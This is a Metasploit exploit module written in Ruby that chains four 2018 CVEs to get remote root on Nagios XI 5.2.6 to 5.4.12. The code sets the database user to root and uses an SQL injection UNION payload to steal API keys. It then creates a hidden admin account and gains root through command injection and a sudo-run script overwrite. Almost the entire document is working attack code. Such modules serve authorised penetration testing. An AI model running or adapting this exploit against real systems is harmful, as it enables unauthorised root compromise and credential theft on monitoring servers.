# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Nagios XI Chained Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a few different vulnerabilities in Nagios XI 5.2.6-5.4.12 to gain remote root access.
        The steps are:
          1. Issue a POST request to /nagiosql/admin/settings.php which sets the database user to root.
          2. SQLi on /nagiosql/admin/helpedit.php allows us to enumerate API keys.
          3. The API keys are then used to add an administrative user.
          4. An authenticated session is established with the newly added user
          5. Command Injection on /nagiosxi/backend/index.php allows us to execute the payload with nopasswd sudo,
          giving us a root shell.
          6. Remove the added admin user and reset the database user.
      },
      &#039;Author&#039;         =>
        [
          &#039;Cale Smith&#039;,   # @0xC413
          &#039;Benny Husted&#039;, # @BennyHusted
          &#039;Jared Arave&#039;   # @iotennui
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           => [ARCH_X86],
      &#039;CmdStagerFlavor&#039; => [&#039;printf&#039;],
      &#039;Targets&#039;        =>
        [
          [
            &#039;Nagios XI 5.2.6 <= 5.4.12&#039;,
            upper_version: Gem::Version.new(&#039;5.4.12&#039;),
            lower_version: Gem::Version.new(&#039;5.2.6&#039;)
          ]
        ],
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;44560&#039;],
          [&#039;CVE&#039;, &#039;2018-8733&#039;],
          [&#039;CVE&#039;, &#039;2018-8734&#039;],
          [&#039;CVE&#039;, &#039;2018-8735&#039;],
          [&#039;CVE&#039;, &#039;2018-8736&#039;],
          [&#039;URL&#039;, &#039;http://blog.redactedsec.net/exploits/2018/04/26/nagios.html&#039;]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DefaultOptions&#039; => {
         &#039;WSFDELAY&#039; => 30
      },
      &#039;DisclosureDate&#039;  => &#039;Apr 17, 2018&#039;,
      &#039;DefaultTarget&#039;   => 0))
    register_options(
      [
        #WSFDelay option is being ignored, getting around this with a call to Rex.sleep
        #Sometimes Nagios doesn&#039;t execute commands immediately, so play with this parameter.
        Opt::RPORT(80),
        OptInt.new(&#039;WAIT&#039;, [ true, "Number of seconds to wait for exploit to run", 15 ])
      ])
    deregister_options(&#039;SRVHOST&#039;, &#039;SRVPORT&#039;)
  end

  def check
    vprint_status "STEP 0: Get Nagios XI version string."
    res = send_request_cgi!({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => &#039;/nagiosxi/&#039;
    })

    if !res || !res.get_html_document
      fail_with(Failure::Unknown, &#039;Could not check nagios version&#039;)
    end

    if (@version = res.get_html_document.at(&#039;//input[@name = "version"]/@value&#039;).text)
      @version = Gem::Version.new(@version)
      vprint_good("STEP 0: Found Nagios XI version: #{@version.to_s}")
      if @version < target[:lower_version]
        vprint_bad(&#039;Try nagios_xi_chained for this version.&#039;)
      elsif (@version <= target[:upper_version] && @version >= target[:lower_version])
        return CheckCode::Appears
      end
    end
    CheckCode::Safe
  end

  def set_db_user(usr, passwd)
    step = usr == &#039;root&#039; ? &#039;1&#039; : &#039;6.1&#039;
    vprint_status "STEP #{step}: Setting Nagios XI DB user to #{usr}."
    res = send_request_cgi({
      &#039;uri&#039; => &#039;/nagiosql/admin/settings.php&#039;,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;ctype&#039;  => &#039;application/x-www-form-urlencoded&#039;,
      &#039;encode_params&#039; => true,
      &#039;vars_post&#039;   => {
        &#039;txtRootPath&#039;=>&#039;nagiosql&#039;,
        &#039;txtBasePath&#039;=>&#039;/var/www/html/nagiosql/&#039;,
        &#039;selProtocol&#039;=>&#039;http&#039;,
        &#039;txtTempdir&#039;=>&#039;/tmp&#039;,
        &#039;selLanguage&#039;=>&#039;en_GB&#039;,
        &#039;txtEncoding&#039;=>&#039;utf-8&#039;,
        &#039;txtDBserver&#039;=>&#039;localhost&#039;,
        &#039;txtDBport&#039;=>3306,
        &#039;txtDBname&#039;=>&#039;nagiosql&#039;,
        &#039;txtDBuser&#039;=> usr,
        &#039;txtDBpass&#039;=> passwd,
        &#039;txtLogoff&#039;=>3600,
        &#039;txtLines&#039;=>15,
        &#039;selSeldisable&#039;=>1
      }
    })

    if !res || res.code != 302
      fail_with(Failure::UnexpectedReply,"STEP #{step}: Unexpected response setting db user to root")
    end
    vprint_status "STEP #{step}: Received a 302 Response. That&#039;s good!"
  end

  def get_api_keys
    vprint_status &#039;STEP 2: Exploiting SQLi to extract user API keys.&#039;

    sqli_parm = @version < Gem::Version.new(&#039;5.3.0&#039;) ? &#039;backend_ticket&#039; : &#039;api_key&#039;
    sqli_val = rand_text_alpha(rand(5) + 5)
    res = send_request_cgi({
      &#039;uri&#039; => &#039;/nagiosql/admin/helpedit.php&#039;,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;ctype&#039; => &#039;application/x-www-form-urlencoded&#039;,
      &#039;encode_params&#039; => true,
      &#039;vars_post&#039; => {
        &#039;selInfoKey1&#039;=>"#{sqli_val}&#039;UNION SELECT CONCAT(&#039;START_API:&#039;,#{sqli_parm},&#039;:END_API&#039;) FROM nagiosxi.xi_users-- ",
        &#039;hidKey1&#039;=>&#039;common&#039;,
        &#039;selInfoKey2&#039;=>&#039;free_variables_name&#039;,
        &#039;hidKey2&#039;=>&#039;&#039;,
        &#039;selInfoVersion&#039;=>&#039;&#039;,
        &#039;hidVersion&#039;=>&#039;&#039;,
        &#039;taContent&#039;=>&#039;&#039;,
        &#039;modus&#039;=>0
      }
    })

    if !res || res.code != 302 || !res.body
      fail_with(Failure::UnexpectedReply,&#039;STEP 2: Unexpected response extracting api keys&#039;)
    end

    vprint_status &#039;STEP 2: Received a 302 Response. That\&#039;s good!&#039;
    parse_api_key(res.body)
  end

  def parse_api_key(res_body)
    begin_positions = res_body.enum_for(:scan, /START_API:/).map { Regexp.last_match.end(0) }
    end_positions = res_body.enum_for(:scan, /:END_API/).map { Regexp.last_match.begin(0) - 1 }
    api_keys = []

    begin_positions.each_with_index do|val, i|
      key = res_body[val..end_positions[i]]
      unless api_keys.include?(key)
        api_keys << key
      end
    end

    if api_keys.length < 1
      fail_with(Failure::Unknown, &#039;Could not parse api keys&#039;)
    end

    vprint_status "Found #{api_keys.length.to_s} unique api keys"
    api_keys.each do |key|
      vprint_status key
    end

    api_keys
  end

  def add_admin(keys, username, password)
    vprint_status &#039;STEP 3: Using API Keys to add an administrative user...&#039;
    keys.each do |key|
      user_id = try_add_admin(key, username, password)

      if (user_id.to_i > 0)
        vprint_good "Added user:#{username} password:#{password} userid:#{user_id}"
        return user_id.to_s, key
      end
    end
    fail_with(Failure::Unknown, &#039;STEP 3: Failed to add a user.&#039;)
  end

  def try_add_admin(key, username, passwd)
    vprint_status "STEP 3: trying to add admin user with key #{key}"
    res = send_request_cgi({
      &#039;uri&#039;=> "/nagiosxi/api/v1/system/user",
      &#039;method&#039; => &#039;POST&#039;,
      &#039;ctype&#039; => &#039;application/x-www-form-urlencoded&#039;,
      &#039;vars_get&#039; => {
        &#039;apikey&#039; => key,
      },
      &#039;vars_post&#039; =>{
        &#039;username&#039;   => username,
        &#039;password&#039;   => passwd,
        &#039;name&#039;       => rand_text_alpha(rand(5) + 5),
        &#039;email&#039;      =>"#{username}@localhost",
        &#039;auth_level&#039; =>&#039;admin&#039;,
        &#039;force_pw_change&#039; => 0
      }
    })

    json = res.get_json_document
    json[&#039;userid&#039;] ? json[&#039;userid&#039;].to_i : -1
  end

  def delete_admin(key, user_id)
    res = send_request_cgi({
      &#039;uri&#039;=> "/nagiosxi/api/v1/system/user/#{user_id}",
      &#039;method&#039; => &#039;DELETE&#039;,
      &#039;ctype&#039; => &#039;application/x-www-form-urlencoded&#039;,
      &#039;vars_get&#039; => {
        &#039;apikey&#039; => key
      }
    })

    res.body && res.body.include?(&#039;was added successfully&#039;) ? username : false
  end

  def login(username, password)
    vprint_status "STEP 4.1: Authenticate as user #{username} with password #{password}"
    #4.1 Get nsp for login
    vprint_status &#039;STEP 4.1: Get NSP and nagiosxi for login..&#039;
    res = send_request_cgi({
      &#039;uri&#039; =>&#039;/nagiosxi/login.php&#039;,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;ctype&#039; => &#039;application/x-www-form-urlencoded&#039;
    })

    if !res || !res.body
      fail_with(Failure::Unknown, &#039;STEP 4.1: Could not get nsp string for login&#039;)
    end

    login_nsp = parse_nsp_str(res.body)
    vprint_status "STEP 4.1: login_nsp #{login_nsp} "

    login_nagiosxi = parse_nagiosxi(res)
    vprint_status "STEP 4.1: login_nagiosxi #{login_nagiosxi}"

    vprint_status &#039;STEP 4.2: Authenticating...&#039;
    res = send_request_cgi({
      &#039;uri&#039;=> &#039;/nagiosxi/login.php&#039;,
      &#039;ctype&#039; => &#039;application/x-www-form-urlencoded&#039;,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => "nagiosxi=#{login_nagiosxi};",
      &#039;vars_post&#039;=> {
        &#039;nsp&#039; => login_nsp,
        &#039;page&#039; => &#039;auth&#039;,
        &#039;debug&#039; => &#039;&#039;,
        &#039;pageopt&#039; => &#039;login&#039;,
        &#039;username&#039; => username,
        &#039;password&#039; => password,
        &#039;loginButton&#039; => &#039;&#039;
      }
    })

    if !res || res.code != 302
      fail_with(Failure::Unknown, &#039;STEP 4.2 Could not get authed nsp string.&#039;)
    end

    authed_nagiosxi = parse_nagiosxi(res)
    vprint_status "STEP 4.2: authed_nagiosxi #{authed_nagiosxi}"
    authed_nagiosxi
  end

  def parse_nsp_str(resp_body)
    nsp_strs = /var nsp_str = "(.+)";\n/.match(resp_body)

    unless nsp_strs || nsp_strs.length < 2
      fail_with(Failure::NotFound, &#039;Could not find nsp_str&#039;)
    end

    nsp_strs[1]
  end

  def parse_nagiosxi(res)
    cookie = res.get_cookies
    matches = /.*nagiosxi=(.+);/.match(cookie)

    unless matches || matches.length < 2
      fail_with(Failure::NotFound, &#039;Could not find nagiosxi cookie&#039;)
    end

    matches[1]
  end

  def execute_command(cmd, opts = {})
    backup_file = rand_text_alpha(rand(5) + 10)

    cmd_execution = "$(cp /usr/local/nagiosxi/scripts/reset_config_perms.sh /usr/local/nagiosxi/scripts/#{backup_file} ; echo \"#{cmd}\" > /usr/local/nagiosxi/scripts/reset_config_perms.sh ; sudo /usr/local/nagiosxi/scripts/reset_config_perms.sh) &"

    cmd_cleanup = "$(mv /usr/local/nagiosxi/scripts/#{backup_file} /usr/local/nagiosxi/scripts/reset_config_perms.sh)"
    opts_exec = {
      &#039;uri&#039;=> &#039;/nagiosxi/backend/index.php&#039;,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;ctype&#039; => &#039;application/x-www-form-urlencoded&#039;,
      &#039;cookie&#039; => "nagiosxi=#{@nagiosxi}",
      &#039;vars_get&#039; => {
        &#039;cmd&#039;=>&#039;submitcommand&#039;,
        &#039;command&#039;=>&#039;1111&#039;,
        &#039;command_data&#039;=> cmd_execution
      }
    }

    opts_cleanup = {
      &#039;uri&#039;=> &#039;/nagiosxi/backend/index.php&#039;,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;ctype&#039; => &#039;application/x-www-form-urlencoded&#039;,
      &#039;cookie&#039; => "nagiosxi=#{@nagiosxi}",
      &#039;vars_get&#039; => {
        &#039;cmd&#039;=>&#039;submitcommand&#039;,
        &#039;command&#039;=>&#039;1111&#039;,
        &#039;command_data&#039;=> cmd_cleanup
      }
    }

    vprint_status &#039;STEP 5.1: executing payload&#039;
    res = send_request_cgi(opts_exec)

    if !res || res.code != 200
      fail_with(Failure::Unknown, &#039;STEP 5.1: Command execution failed&#039;)
    end

    vprint_status &#039;STEP 5.2: removing scripts from disc&#039;
    res = send_request_cgi(opts_cleanup)

    if !res || res.code != 200
      fail_with(Failure::Unknown, &#039;STEP 5.2: Command cleanup failed&#039;)
    end
  end

  def exploit
    if check != CheckCode::Appears
      fail_with(Failure::NotVulnerable, &#039;STEP 0: Vulnerable version not found! punt!&#039;)
    end

    set_db_user(&#039;root&#039;, &#039;nagiosxi&#039;)

    keys = get_api_keys
    username = rand_text_alpha(rand(6) + 10)
    password = rand_text_alpha(rand(6) + 10)

    user_id, key = add_admin(keys, username, password)
    @nagiosxi = login(username, password)
    execute_cmdstager()

    #revert databaseuser
    set_db_user(&#039;nagiosql&#039;, &#039;n@gweb&#039;)
    vprint_status &#039;STEP 6.2: deleting admin&#039;
    delete_admin(key, user_id)

    #The WSFDelay option is being ignored currently, so this is this workaround.
    Rex.sleep(datastore[&#039;WAIT&#039;].to_i)
  end
end

